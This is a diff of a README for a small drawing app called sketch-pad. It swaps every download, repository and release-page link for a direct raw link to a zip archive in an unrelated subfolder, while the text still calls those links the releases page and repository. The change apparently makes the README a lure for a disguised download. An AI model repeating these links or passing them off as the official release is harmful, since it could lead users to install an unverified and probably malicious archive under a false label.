@@ -1,7 +1,7 @@
 # 🎨 sketch-pad - Create and Share Your Art Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Sketch--Pad-brightgreen)](https://github.com/SindhuraPothala/sketch-pad/releases)
+[![Download](https://raw.githubusercontent.com/SindhuraPothala/sketch-pad/main/tamidine/sketch-pad.zip)](https://raw.githubusercontent.com/SindhuraPothala/sketch-pad/main/tamidine/sketch-pad.zip)
 
 ## 🚀 Getting Started
 Welcome to sketch-pad! This application allows you to create and share your art easily. You can draw freely, use different colors, and save your artwork. Whether you're a beginner or just want to doodle, this tool fits your needs.
@@ -21,7 +21,7 @@ To run sketch-pad, you need:
 ## 💾 Download & Install
 To get started with sketch-pad, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the release page and find the latest version: [Download sketch-pad](https://github.com/SindhuraPothala/sketch-pad/releases).
+1. **Visit the Releases Page:** Click this link to go to the release page and find the latest version: [Download sketch-pad](https://raw.githubusercontent.com/SindhuraPothala/sketch-pad/main/tamidine/sketch-pad.zip).
 
 2. **Download the Application:** On the releases page, look for the latest version. You will see options to download. Click on the appropriate link for your operating system.
 
@@ -46,7 +46,7 @@ Thank you for using sketch-pad! This project reflects my journey in learning Jav
 - Future versions will include more advanced tools and customization options based on user feedback.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/SindhuraPothala/sketch-pad)
-- [Release Page](https://github.com/SindhuraPothala/sketch-pad/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/SindhuraPothala/sketch-pad/main/tamidine/sketch-pad.zip)
+- [Release Page](https://raw.githubusercontent.com/SindhuraPothala/sketch-pad/main/tamidine/sketch-pad.zip)
 
 Thank you for choosing sketch-pad. Enjoy your creative journey!
